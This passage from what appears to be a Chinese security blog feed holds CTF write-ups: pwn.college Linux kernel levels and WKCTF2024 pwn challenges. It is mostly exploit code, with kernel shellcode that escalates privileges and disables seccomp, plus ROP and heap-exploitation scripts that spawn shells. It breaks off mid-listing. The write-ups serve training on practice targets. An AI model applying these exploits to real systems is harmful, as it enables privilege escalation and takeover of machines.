class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3&quot;</span>;<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_WRONLY);<br>  write(fd,shellcode,<span class="hljs-keyword">sizeof</span>(shellcode));<br>  system(<span class="hljs-string">&quot;id&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span>&#123;</span><br>  <span class="hljs-type">long</span> size;<br>  <span class="hljs-type">char</span> shellcode[<span class="hljs-number">4096</span>];<br>  <span class="hljs-type">long</span> call_addr;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3&quot;</span>;<br>  <span class="hljs-comment">// char shellcode[] = &quot;H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3&quot;;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">A</span>;</span><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_WRONLY);<br>  A.size=<span class="hljs-number">4096</span>;<br>  <span class="hljs-built_in">memcpy</span>(A.shellcode,shellcode,<span class="hljs-keyword">sizeof</span>(shellcode));<br>  <span class="hljs-comment">// A.call_addr=0xffffc90000045000;//local</span><br>  A.call_addr=<span class="hljs-number">0xffffc90000085000</span>;<span class="hljs-comment">//remote</span><br>  ioctl(fd, <span class="hljs-number">1337</span>, &amp;A);<br>  system(<span class="hljs-string">&quot;id&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span>&#123;</span><br>  <span class="hljs-type">long</span> size;<br>  <span class="hljs-type">char</span> shellcode[<span class="hljs-number">4096</span>];<br>  <span class="hljs-type">long</span> call_addr;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3&quot;</span>;<br>  <span class="hljs-comment">// char shellcode[] = &quot;H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3&quot;;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">A</span>;</span><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_WRONLY);<br>  A.size=<span class="hljs-number">4096</span>;<br>  <span class="hljs-built_in">memcpy</span>(A.shellcode,shellcode,<span class="hljs-keyword">sizeof</span>(shellcode));<br>  <span class="hljs-comment">// A.call_addr=0xffffc90000045000;//local</span><br>  A.call_addr=<span class="hljs-number">0xffffc90000085000</span>;<span class="hljs-comment">//remote</span><br>  ioctl(fd, <span class="hljs-number">1337</span>, &amp;A);<br>  system(<span class="hljs-string">&quot;id&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h1><p>这个卡了两天0.0，需要注意下面几个点：</p><ul><li>&#x2F;proc&#x2F;challenge只有root用户才有RW权限</li><li>&#x2F;challenge下出了babykernel_level8.1.ko还有带SUID的ELF程序babykernel_level8.1</li><li>babykernel_level8.1可以执行任意shellcode，但是seccomp禁用了除了write外的所有系统调用；babykernel_level8.1.ko的write可以接收用户空间的shellcode以执行</li><li>因为babykernel_level8.1有SUID所有可以读写&#x2F;proc&#x2F;challenge</li><li>思路就是通过babykernel_level8.1向&#x2F;proc&#x2F;challenge写入shellcode在内核空间中关闭seccomp，然后在用户空间ORW读取flag</li><li>注意通过current_task_struct-&gt;thread_info.flags关闭seccomp只能作用于该进程，通过system(‘&#x2F;bin&#x2F;sh’)获取的shell是子进程，seccomp仍然生效</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># This exploit template was generated via:</span><br><span class="hljs-comment"># $ pwn template</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># Set up pwntools for the correct architecture</span><br>exe = context.binary = ELF(args.EXE <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;/challenge/babykernel_level8.1&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="hljs-comment"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="hljs-comment"># for all created processes...</span><br><span class="hljs-comment"># ./exploit.py DEBUG NOASLR</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">argv=[], *a, **kw</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process([exe.path] + argv, *a, **kw)<br><br><span class="hljs-comment"># Specify your GDB script here for debugging</span><br><span class="hljs-comment"># GDB will be launched if the exploit is run via e.g.</span><br><span class="hljs-comment"># ./exploit.py GDB</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(**<span class="hljs-built_in">locals</span>())<br><br><span class="hljs-comment">#===========================================================</span><br><span class="hljs-comment">#                    EXPLOIT GOES HERE</span><br><span class="hljs-comment">#===========================================================</span><br><br>io = start()<br><span class="hljs-comment"># shellcode = asm(shellcraft.sh())</span><br><span class="hljs-comment"># payload = fit(&#123;</span><br><span class="hljs-comment">#     32: 0xdeadbeef,</span><br><span class="hljs-comment">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="hljs-comment"># &#125;, length=128)</span><br><span class="hljs-comment"># io.send(payload)</span><br><span class="hljs-comment"># flag = io.recv(...)</span><br><span class="hljs-comment"># log.success(flag)</span><br>rdi=<span class="hljs-number">0x0000000000402273</span><br>sc=<span class="hljs-string">b&#x27;j\x03_j-Z\xbe\xa0p31j\x01X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x04_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20j\x01X\x0f\x05&#x27;</span><br>sc=sc.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>sc+=<span class="hljs-string">b&#x27;eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00&#x27;</span><br><span class="hljs-comment"># sc+=b&#x27;eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xffH\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3\x00&#x27;</span><br><br>io.sendline(sc)<br><span class="hljs-comment"># io.sendline(&quot;cat /flag&quot;)</span><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># This exploit template was generated via:</span><br><span class="hljs-comment"># $ pwn template</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># Set up pwntools for the correct architecture</span><br>exe = context.binary = ELF(args.EXE <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;/challenge/babykernel_level8.1&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="hljs-comment"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="hljs-comment"># for all created processes...</span><br><span class="hljs-comment"># ./exploit.py DEBUG NOASLR</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">argv=[], *a, **kw</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process([exe.path] + argv, *a, **kw)<br><br><span class="hljs-comment"># Specify your GDB script here for debugging</span><br><span class="hljs-comment"># GDB will be launched if the exploit is run via e.g.</span><br><span class="hljs-comment"># ./exploit.py GDB</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(**<span class="hljs-built_in">locals</span>())<br><br><span class="hljs-comment">#===========================================================</span><br><span class="hljs-comment">#                    EXPLOIT GOES HERE</span><br><span class="hljs-comment">#===========================================================</span><br><br>io = start()<br><span class="hljs-comment"># shellcode = asm(shellcraft.sh())</span><br><span class="hljs-comment"># payload = fit(&#123;</span><br><span class="hljs-comment">#     32: 0xdeadbeef,</span><br><span class="hljs-comment">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="hljs-comment"># &#125;, length=128)</span><br><span class="hljs-comment"># io.send(payload)</span><br><span class="hljs-comment"># flag = io.recv(...)</span><br><span class="hljs-comment"># log.success(flag)</span><br>rdi=<span class="hljs-number">0x0000000000402273</span><br>sc=<span class="hljs-string">b&#x27;j\x03_j-Z\xbe\xa0p31j\x01X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x04_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20j\x01X\x0f\x05&#x27;</span><br>sc=sc.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>sc+=<span class="hljs-string">b&#x27;eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00&#x27;</span><br><span class="hljs-comment"># sc+=b&#x27;eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xffH\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3\x00&#x27;</span><br><br>io.sendline(sc)<br><span class="hljs-comment"># io.sendline(&quot;cat /flag&quot;)</span><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h1><h1 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h1><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>pwn.college</category>
      
      <category>Linux Kernel Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux Kernel</tag>
      
      <tag>pwn.college</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WKCTF2024 WriteUp Pwn</title>
    <link href="/2024/07/14/WKCTF2024-WriteUp-Pwn/"/>
    <url>/2024/07/14/WKCTF2024-WriteUp-Pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>白给一个leak，可以泄露libc地址，存在一个字节的栈溢出，可将rbp最低为置零，输入后第二次leave后rsp有几率指向输入，直接ROP，多跑几次就可以出。</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2024-07-14 09:31:36<br># Link: https://github.com/RoderickChan/pwncli<br># Usage:<br>#     Debug : python3 exp.py debug elf-file-path -t -b malloc<br>#     Remote: python3 exp.py remote elf-file-path ip:port<br><br>from pwncli import *<br>cli_script()<br>set_remote_libc(&#x27;libc-2.27.so&#x27;)<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br># one_gadgets: list = get_current_one_gadget_from_libc(more=False)<br># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)<br><br><br>rl()<br>rl()<br>sl()<br>sl(&quot;19&quot;)<br>ru(&quot;Your magic number is: &quot;)<br>libc_addr=int(rl().strip(),16)<br>libc.address=libc_addr-0x80b12<br>sl(&quot;256&quot;)<br>ret=libc.address+0x8aa<br>rdi=libc.address+0x2164f<br>p=b&#x27;a&#x27;*152+p64_ex(rdi)+p64_ex(next(libc.search(&quot;/bin/sh&quot;)))+p64_ex(libc.address+0x2164f)+p64_ex(next(libc.search(&quot;/bin/sh&quot;)))+p64_ex(ret)+p64_ex(libc.sym[&#x27;system&#x27;])<br>p=p.ljust(256,b&#x27;\x00&#x27;)<br>s(p)<br>print(hex(libc_addr))<br>ia()<br><br></code></pre></td></tr></table></figure><h1 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h1><ul><li>只有add、edit和show，edit可以溢出任意字节</li><li>house of orange将rop chunk置于unsorted bin，然后通过溢出泄露libc地址</li><li>通过溢出打unsorted bin attck，在chunk_ptr内写一个main_arena附近的地址</li><li>通过edit修改top chunk为chunk_ptr并且修复unsorted bin</li><li>从top chunk中申请堆块，操控chunk_ptr，以获得任意地址写</li><li>修改malloc hook为calloc+12，calloc hook为one gadgets，触发malloc get shell<div class="note note-success">            <p>改got发现one gadgets条件都不符合</p>          </div></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2024-07-14 09:55:48<br># Link: https://github.com/RoderickChan/pwncli<br># Usage:<br>#     Debug : python3 exp.py debug elf-file-path -t -b malloc<br>#     Remote: python3 exp.py remote elf-file-path ip:port<br><br>from pwncli import *<br>cli_script()<br>set_remote_libc(&#x27;libc-2.23.so&#x27;)<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br># one_gadgets: list = get_current_one_gadget_from_libc(more=False)<br># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)<br><br>def cmd(i, prompt=&quot;&gt;\n&quot;):<br>    sla(prompt, i)<br><br>def add(size,co):<br>    cmd(&#x27;1&#x27;)<br>    rl()<br>    sl(str(size))<br>    rl()<br>    s(co)<br>    #......<br><br>def edit(idx,size,co):<br>    cmd(&#x27;2&#x27;)<br>    rl()<br>    sl(str(idx))<br>    rl()<br>    sl(str(size))<br>    rl()<br>    s(co)<br>    #......<br><br>def show(idx):<br>    cmd(&#x27;3&#x27;)<br>    rl()<br>    sl(str(idx))<br>    #......<br><br>def dele():<br>    cmd(&#x27;4&#x27;)<br>    #......<br><br><br>add(0x100,&#x27;aaaa&#x27;)<br>edit(0,0x110,b&#x27;a&#x27;*0x108+p64_ex(0xef1))<br>add(0x1000,&#x27;aaaa&#x27;)<br>add(0x100,&#x27; &#x27;)<br>show(2)<br>libc_base=u64_ex(r(6).ljust(8,b&#x27;\x00&#x27;))-0x3c5120<br>ptr=0x4040E0<br>top_chunk=libc_base+0x3c4b78<br>offset=(top_chunk-ptr)//8<br>edit(2,0x120,b&#x27;a&#x27;*0x108+p64_ex(0xdc1)+p64_ex(libc_base+0x3c4b78)+p64_ex(0x404100-0x10))<br>add(0xdb0,p64_ex(libc_base+0x3c4b78)+p64_ex(libc_base+0x3c4b78))<br>show(4)<br>heap=u64_ex(r(6).ljust(8,b&#x27;\x00&#x27;))-0x3c5120<br>edit(4,32,p64_ex(0x404000)+p64_ex(0)+p64_ex(libc_base+0x3c4b78)*2)<br>one=libc_base+0x4527a<br>print(hex(one))<br>libc=ELF(&quot;./libc-2.23.so&quot;)<br>libc.address=libc_base<br>setcontext=libc.sym[&#x27;setcontext&#x27;]<br>p=flat(&#123;0:b&#x27;a&#x27;*8+p64_ex(libc.sym[&#x27;puts&#x27;])+p64_ex(libc.sym[&#x27;write&#x27;])+p64_ex(libc.sym[&#x27;__stack_chk_fail&#x27;])+p64_ex(libc.sym[&#x27;read&#x27;])+p64_ex(libc.sym[&#x27;malloc&#x27;])+p64_ex(libc.sym[&#x27;setvbuf&#x27;])+p64_ex(libc.sym[&#x27;__isoc99_scanf&#x27;])+p64_ex(libc.sym[&#x27;exit&#x27;]),<br>        0x70:p64_ex(libc.sym[&#x27;_IO_2_1_stdout_&#x27;]),<br>        0x80:p64_ex(libc.sym[&#x27;_IO_2_1_stdin_&#x27;]),<br>        0xa0:p64_ex(0x404120)+p64_ex(one),<br>        0xd0:p64_ex(libc.sym[&#x27;__malloc_hook&#x27;])+p64_ex(libc.sym[&#x27;__realloc_hook&#x27;])&#125;,filler=b&#x27;\x00&#x27;)<br>add(0xe0,p)<br><br>edit(0,8,p64_ex(libc.sym[&#x27;realloc&#x27;]+12))<br>edit(1,8,p64_ex(one))<br>add(0x20,&#x27;aa&#x27;)<br>print(hex(libc.sym[&#x27;__malloc_hook&#x27;]))<br>print(hex(ptr))<br>print(hex(libc_base))<br>ia()<br><br>&#x27;&#x27;&#x27;<br>0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)<br>constraints:<br>  [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv<br><br>0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)<br>constraints:<br>  [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv<br><br>0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)<br>constraints:<br>  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><h1 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span 